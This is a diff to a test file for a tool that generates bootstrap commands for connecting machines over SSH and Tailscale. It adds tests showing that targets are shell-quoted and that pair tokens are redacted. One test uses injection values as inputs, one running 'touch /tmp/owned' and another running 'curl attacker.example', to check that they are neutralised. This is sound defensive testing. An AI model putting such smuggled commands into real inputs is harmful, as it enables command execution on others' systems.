@@ -13,14 +13,13 @@ describe('bootstrap command generation and diagnostics', () => {
       pairToken,
       sshTarget: 'dev@example.internal',
       tailscaleTarget: 'dev@tail-host',
-      serviceModes: ['manual', 'launchd', 'systemd-user', 'systemd-system', 'wsl-systemd', 'wsl-manual'],
+      serviceModes: ['manual', 'launchd', 'systemd-user', 'wsl-systemd', 'wsl-manual'],
     });
 
     expect(commands.map((command) => command.id)).toEqual([
       'local-manual',
       'macos-launchd',
       'linux-systemd-user',
-      'linux-systemd-system',
       'wsl-systemd',
       'wsl-manual',
       'ssh-auto',
@@ -28,12 +27,44 @@ describe('bootstrap command generation and diagnostics', () => {
     ]);
     expect(commands[0]!.command).toContain(`--pair-token '${pairToken}'`);
     expect(commands[0]!.redactedCommand).not.toContain(pairToken);
-    expect(commands[6]!.command).toContain("ssh dev@example.internal 'bash -s'");
-    expect(commands[7]!.command).toContain("tailscale ssh dev@tail-host 'bash -s'");
+    expect(commands[5]!.command).toContain("ssh 'dev@example.internal' 'bash -s'");
+    expect(commands[6]!.command).toContain("tailscale ssh 'dev@tail-host' 'bash -s'");
     for (const command of commands) {
       expect(command.redactedCommand).toContain('pair_…redacted');
       expect(command.command).toContain('https://hub.example.com');
       expect(command.command).toContain(pairToken);
+    }
+  });
+
+  it('shell-quotes ssh and tailscale targets before embedding them in remote commands', () => {
+    const commands = generateBootstrapCommands({
+      hubUrl: 'https://hub.example.com',
+      pairToken: 'pair_secret-token-value',
+      sshTarget: "dev@example.internal; touch /tmp/owned; echo '",
+      tailscaleTarget: 'tail-host && curl attacker.example',
+      serviceModes: ['manual'],
+    });
+
+    const ssh = commands.find((command) => command.id === 'ssh-auto')?.command ?? '';
+    const tailscale =
+      commands.find((command) => command.id === 'tailscale-ssh-auto')?.command ?? '';
+
+    expect(ssh).toContain("ssh 'dev@example.internal; touch /tmp/owned; echo '\"'\"'' 'bash -s'");
+    expect(tailscale).toContain("tailscale ssh 'tail-host && curl attacker.example' 'bash -s'");
+    expect(ssh).not.toContain('ssh dev@example.internal;');
+    expect(tailscale).not.toContain('tailscale ssh tail-host &&');
+  });
+
+  it('keeps foreground connect commands free of service-manager flags', () => {
+    const commands = generateBootstrapCommands({
+      hubUrl: 'https://hub.example.com',
+      pairToken: 'pair_secret-token-value',
+      serviceModes: ['manual', 'wsl-manual'],
+    });
+
+    for (const command of commands) {
+      expect(command.command).toContain('node connect');
+      expect(command.command).not.toContain('--service');
     }
   });
 
